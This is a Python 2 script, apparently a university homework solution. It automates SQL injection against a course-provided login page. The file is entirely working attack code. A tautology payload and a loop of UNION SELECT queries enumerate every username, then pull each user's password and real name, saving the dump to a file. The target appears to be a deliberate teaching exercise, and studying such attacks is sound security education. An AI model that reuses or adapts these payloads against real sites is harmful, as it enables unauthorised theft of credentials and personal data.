#!/usr/bin/env python2
"""Simple script to automate SQL queryion"""

import pprint
import re

from twill.commands import *

website = "http://web.engr.oregonstate.edu/cgi-bin/cgiwrap/rosulekm/sqli-hw.cgi"
def query(formval):
    go(website)
    formvalue("1", "u", formval)
    submit()
    raw = show()

    m = re.search("Welcome, ([a-zA-Z 0-9]+)</p>", raw)
    if m:
        result = m.group(1)
    else:
        result = ""

    return result

def main():
    table = [("uname", "pw", "realname")]
    user = query("' or '1'='1' --")
    pw = query("' UNION SELECT pwd, null, null from users where uname='"
            +user+"' --")
    realname = query("' UNION SELECT realname, null, null from users where uname='"
            +user+"' --")
    row = (user, pw, realname)

    table.append(row)

    while True:
        user = query("' UNION SELECT MIN(uname), null, null from users where uname > '"
                     +user+"' --")

        # break out when we finally reach a bad query
        if not user:
            break

        pw = query("' UNION SELECT pwd, null, null from users where uname='"
                   +user+"' --")
        realname = query("' UNION SELECT realname, null, null from users where uname='"
                         +user+"' --")
        row = (user, pw, realname)

        table.append(row)

    # output results
    pprint.pprint(table)
    with open("table.txt", "w") as f:
        pprint.pprint(table, f)

if __name__ == "__main__":

    main()
